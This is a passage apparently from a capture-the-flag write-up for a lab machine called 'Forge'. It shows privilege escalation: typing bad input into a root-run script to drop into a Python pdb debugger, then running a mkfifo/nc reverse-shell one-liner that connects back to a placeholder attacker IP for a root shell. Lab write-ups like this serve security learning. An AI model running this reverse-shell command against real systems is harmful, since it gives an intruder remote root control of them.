...
![image](/media/Forge/forge_10.png)

the other ssh session to interact with the port listening :

![image](/media/Forge/forge_11.png)

raised the error by typing ``id `` while it expects a number and get the pdb shell we can now get a reverse shell  :


```bash
(/media/Forge/Pdb) import os
(/media/Forge/Pdb) os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <my_ip> 9999 >/tmp/f")
```

![image](/media/Forge/forge_14.png)


gain root reverse shell :

![image](/media/Forge/forge_15.png)
